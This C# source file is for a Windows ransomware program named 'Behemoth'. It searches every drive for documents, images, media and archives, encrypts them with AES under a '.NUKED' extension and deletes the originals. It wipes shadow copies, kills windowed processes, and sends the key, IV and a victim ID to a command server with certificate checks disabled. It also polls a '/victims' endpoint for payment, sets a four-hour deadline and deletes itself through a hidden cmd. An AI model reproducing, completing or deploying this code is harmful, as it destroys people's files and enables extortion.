using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using IWshRuntimeLibrary;
using System.Management;
using System.Reflection;


namespace Behemoth
{
    internal static class Program
    {

        /// <summary>
        /// This method is responsible for getting a list of accessible Disks/Drives within a system. It's also going to ignore all exception;
        /// Some disks might not just be accessible so it's better to ignore those and only focus on the ones we can work with.
        /// </summary>
        /// <param name="args"></param>
        public static IEnumerable<string> Disks()
        {
            List<string> dlist = new List<string>();
            try
            {
                DriveInfo[] drives = DriveInfo.GetDrives();
                foreach (DriveInfo drive in drives)
                {
                    dlist.Add(drive.Name);
                }
            }
            catch { }
            return dlist;
        }


        /// <summary>
        /// This method is responsible for searching directories recursively within a dirve to find specific files.
        /// </summary>
        /// <param name="args"></param>
        public static IEnumerable<string> EnumerateFilesRecursive(string root)
        {
            string[] extensions = { ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt",
                                    ".csv", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".tif", ".mp3", ".mp4", ".avi",
                                        ".mov", ".wmv", ".zip", ".rar", ".bin", ".dat", ".enc" };
            var todo = new Queue<string>();
            todo.Enqueue(root);

            while (todo.Count > 0)
            {
                string dir = todo.Dequeue();
                string[] subdirs = new string[0];
                string[] files = new string[0];

                try
                {
                    subdirs = Directory.GetDirectories(dir);
                    files = Directory.GetFiles(dir).Where(file => extensions.Any(ext => file.EndsWith(ext))).ToArray();
                }
                catch { }

                foreach (string subdir in subdirs)
                {
                    todo.Enqueue(subdir);
                }

                foreach (string filename in files)
                {
                    yield return filename;
                }
            }
        }


        /// <summary>
        /// This method takes a string length as an integer and returns a random string.
        /// </summary>
        private static Random random = new Random();
        public static string RString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }


        /// <summary>
        /// This method takes an input file, an encrypton key and an IV and returns the output file's path. 
        /// It also changes a file's extension and deletes the original file. 
        /// </summary>
        /// <param name="inputFile"></param>
        /// <param name="pass"></param>
        /// <param name="iv"></param>
        public static string AES_Encrypt(string inputFile, string pass, string iv)
        {
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            byte[] passwordBytes = Encoding.ASCII.GetBytes(pass);
            byte[] ivBytes = Encoding.ASCII.GetBytes(iv);
            string outF = null;

            try
            {
                RijndaelManaged AES = new RijndaelManaged();

                AES.KeySize = 256;
                AES.BlockSize = 128;

                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = ivBytes;
                AES.Padding = PaddingMode.Zeros;

                AES.Mode = CipherMode.CBC;

                string outputFile = inputFile + ".NUKED";

                using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
                {
                    using (FileStream fsOut = new FileStream(outputFile, FileMode.Create))
                    {
                        using (CryptoStream cs = new CryptoStream(fsOut, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            int data;
                            while ((data = fsIn.ReadByte()) != -1)
                                cs.WriteByte((byte)data);
                        }
                    }
                }

                System.IO.File.Delete(inputFile);

                outF = outputFile;
            }
            catch { }

            return outF;
        }



        /// <summary>
        /// This function takes an encrypted input file, a key and an IV value and decrypts the file. 
        /// It also removed any customized added extension and deletes the old encrypted file.
        /// </summary>
        /// <param name="inputFile"></param>
        /// <param name="pass"></param>
        /// <param name="iv"></param>
        public static void AES_Decrypt(string inputFile, string pass, string iv)
        {
            try
            {
                byte[] passwordBytes = Encoding.ASCII.GetBytes(pass);
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
                byte[] IV = Encoding.ASCII.GetBytes(iv);

                FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
                RijndaelManaged AES = new RijndaelManaged();

                AES.KeySize = 256;
                AES.BlockSize = 128;

                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = IV;
                AES.Padding = PaddingMode.Zeros;

                AES.Mode = CipherMode.CBC;

                CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);

                FileStream fsOut = new FileStream(Path.ChangeExtension(inputFile, null), FileMode.Create);

                int data;
                while ((data = cs.ReadByte()) != -1)
                    fsOut.WriteByte((byte)data);

                fsOut.Close();
                cs.Close();
                fsCrypt.Close();
                System.IO.File.Delete(inputFile);
            }
            catch { }
        }


        /// <summary>
        /// This function generates a UID for the machine, the UID is created by combining username & mac address.
        /// </summary>
        /// <returns></returns>
        public static string Uid()
        {
            string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            string mac = "";

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet && nic.OperationalStatus == OperationalStatus.Up)
                {
                    mac = nic.GetPhysicalAddress().ToString();
                    break;
                }
            }

            string data = $"{username}|{mac}";
            var dataB = Encoding.UTF8.GetBytes(data);
            string hash = "";

            using (SHA512 sha = new SHA512Managed())
            {
                byte[] hashBytes = sha.ComputeHash(dataB);
                hash = Convert.ToHexString(hashBytes);
            }

            return hash;
        }


        /// <summary>
        /// This function is used to delete Shadow Copies. 
        /// </summary>
        public static void SCWipe()
        {
            try
            {
                ManagementScope scope = new ManagementScope(@"\\.\root\cimv2");
                scope.Connect();
                ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_ShadowCopy");
                ManagementObjectSearcher finder = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection results = finder.Get();
                foreach (ManagementObject sc in results)
                {
                    sc.Delete();
                }

            }
            catch { }
        }


        /// <summary>
        /// This function is used to close all currently running processes.
        /// </summary>
        private static void CloseAllWindows()
        {
            try
            {
                Process me = Process.GetCurrentProcess();
                foreach (Process P in Process.GetProcesses())
                {
                    if (P.Id != me.Id && P.MainWindowHandle != IntPtr.Zero)
                        P.Kill();
                }
            }
            catch { }
        }


        /// <summary>
        /// This function is used to send a HTTP POST request. It takes three values as arguments.
        /// </summary>
        /// <param name="key"></param>
        /// <param name="iv"></param>
        /// <param name="uid"></param>
        /// <returns></returns>
        public static string POSTR(string key, string iv, string uid)
        {
            string responseString = null;
            try
            {
                var request = (HttpWebRequest)WebRequest.Create("https://10.0.0.115:5000/stage1");
                request.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                var pData = $"key={key}&iv={iv}&uid={uid}";
                var data = Encoding.ASCII.GetBytes(pData);

                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = data.Length;
                request.Timeout = 1000 * 10;

                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }
                var response = (HttpWebResponse)request.GetResponse();
                responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
            }
            catch { }

            return responseString;
        }


        /// <summary>
        /// This function checks whether a user has paid the amount or not.
        /// </summary>
        /// <param name="uid"></param>
        /// <returns></returns>
        public static string CheckUser(string uid)
        {
            string responseString = null;
            try
            {
                var request = (HttpWebRequest)WebRequest.Create("https://10.0.0.115:5000/victims");
                request.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                var pData = $"uid={uid}";
                var data = Encoding.ASCII.GetBytes(pData);

                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = data.Length;
                request.Timeout = 1000 * 10;

                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }
                var response = (HttpWebResponse)request.GetResponse();
                responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
            }
            catch { }

            return responseString;
        }


        /// <summary>
        /// This function deletes the current application after it has been terminated.
        /// It has a delay of 10 seconds and waits for the current application to terminate.
        /// </summary>
        public static void Sdstrct()
        {
            string Epath = Process.GetCurrentProcess().MainModule.FileName;
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    Arguments = $"/C timeout 10 & del \"{Epath}\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            catch { }
        }


        /// <summary>
        /// Create a shortcut to the main executable file and place it in Desktop folder.
        /// </summary>
        public static void CShortc()
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string Epath = Process.GetCurrentProcess().MainModule.FileName; // executable's full path
            string appName = Path.GetFileNameWithoutExtension(Epath);
            string shortcutPath = Path.Combine(desktop, $"{appName}.lnk");

            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
            shortcut.TargetPath = Epath;

            shortcut.WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string icon = Assembly.GetEntryAssembly().Location;
            shortcut.IconLocation = icon;
            shortcut.Save();
        }


        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            CloseAllWindows();
            CShortc();

            if (!Properties.Settings.Default.FirstLaunch)
            {
                string uid = Uid();
                Properties.Settings.Default.uid = uid;
                Properties.Settings.Default.Save();

                string key = RString(32);
                string IV = RString(16);

                var dList = Disks();
                object fileWriteLock = new object();

                foreach (string item in dList)
                {
                    string[] files = EnumerateFilesRecursive(item).ToArray();
                    Parallel.ForEach(files, file =>
                    {
                        try
                        {
                            string encPath = AES_Encrypt(file, key, IV);

                            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                            lock (fileWriteLock)
                            {
                                using (StreamWriter output = System.IO.File.AppendText(Path.Combine(desktop, "file_paths.txt")))
                                {
                                    if (encPath != "" && encPath != null)
                                    {
                                        output.WriteLine(encPath);
                                    }
                                }
                            }
                        }
                        catch { }
                    });
                }

                SCWipe();

                string wAddr = POSTR(key, IV, uid);
                Properties.Settings.Default.wAddr = wAddr;
                Properties.Settings.Default.Save();

                Properties.Settings.Default.FirstLaunch = true;
                Properties.Settings.Default.Save();


                var end = DateTime.Now.AddHours(4).ToString("h:mm tt");
                Properties.Settings.Default.End = end;
                Properties.Settings.Default.Save();
            }



            ApplicationConfiguration.Initialize();
            Application.Run(new Form1());
        }
    }
}

